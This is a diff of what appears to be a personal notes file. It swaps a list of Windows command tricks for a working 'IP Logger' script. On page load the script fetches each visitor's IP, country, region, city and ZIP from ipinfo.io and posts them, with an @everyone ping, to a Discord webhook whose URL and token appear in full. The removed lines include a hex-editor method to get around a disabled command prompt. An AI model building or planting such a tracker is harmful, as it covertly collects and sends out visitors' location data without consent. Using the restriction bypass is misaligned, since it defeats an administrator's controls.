@@ -1,24 +1,27 @@
-for shut down:
-shutdown -i
+<script>
+function monke(json) 
+{
+     var request = new XMLHttpRequest();
+     
+     request.open("POST", "https://discord.com/api/webhooks/1150132603098234952/lNcM_2T92HsFEE7MDe8LuXeEfgvOKST0QU3eCyj88l7-xqVpUN3vNK6LDvx6L9cFFIo2");
 
-arp -a
+     request.setRequestHeader('Content-type', 'application/json');
 
-for a message: msg * fazey
- 
-access to cmd:
-first open file loaction then add it to desktop and name it iexplorer
-if it didnt work
-download hxd english put the cmd in side it then go very down then change the last 2 
-numbers and make it from 00 to 09
-if u got the problem: put cmd again and press sarch and then find
-sarch for disablecmd and add unicode string change any thing in side it and save it
+     var params = 
+     {
+          username: "IP Logger",
+          avatar_url: "",
+          content: "@everyone",
+          embeds: [
+               {
+                    title: "Someone visited the IP grabber!",
+                    color: 1752220,
+                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
+               }
+          ]
+     }
 
-best v1 : tasklist
-
-best v2 :  taskkill /IM "  " /f
-
-wanna look hacker: win + r then cmd then write color a
-then write dir/s
-
-vpn:
-https://chrome.google.com/webstore/detail/free-vpn-for-chrome-vpn-p/majdfhpaihoncoakbjgbdhglocklcgno
+     request.send(JSON.stringify(params));
+}
+</script>
+<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
